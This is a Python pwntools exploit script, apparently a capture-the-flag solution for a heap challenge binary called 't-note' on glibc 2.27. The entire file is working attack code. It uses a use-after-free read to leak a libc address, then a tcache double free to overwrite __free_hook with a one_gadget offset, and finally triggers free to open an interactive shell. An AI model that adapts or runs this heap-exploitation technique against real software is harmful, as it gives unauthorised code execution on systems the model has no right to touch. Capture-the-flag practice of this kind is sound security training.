#!/usr/bin/env python3
from pwn import *
epath = "./t-note"
lpath = "/lib/x86_64-linux-gnu/libc-2.27.so"
e = ELF(epath)
l = ELF(lpath)
r = process(epath, env={'LD_PRELOAD': './libc-2.27.so'})

def add(sz, msg):
	r.sendlineafter(">", str(1))
	r.sendlineafter("Size: ", str(sz))
	r.sendlineafter("Note: ", msg)
	r.recvline()
	return
def show(idx):
	r.sendlineafter(">", str(2))
	r.sendlineafter("Index:", str(idx))
	return
def free(idx):
	r.sendlineafter(">", str(3))
	r.sendlineafter("Index:", str(idx))
	return

add(0x500, b"da")
add(0x60, b"da")
add(0x60, b"da")
free(0)
show(0)
r.recvline()
leak = u64(r.recvline().strip().ljust(8, b"\x00"))
success("mchunkptr top : %s" % hex(leak))
l.address = leak - 0x3ebca0
success("libc : %s" % hex(l.address))

free(1)
#free(2)
free(1)
add(0x60, p64(l.sym.__free_hook))
add(0x60, b"da")
add(0x60, p64(l.address+0x4f322))

pause()
#add(0x100, b"da")
free(0)
#free(0)
r.interactive()
r.close()
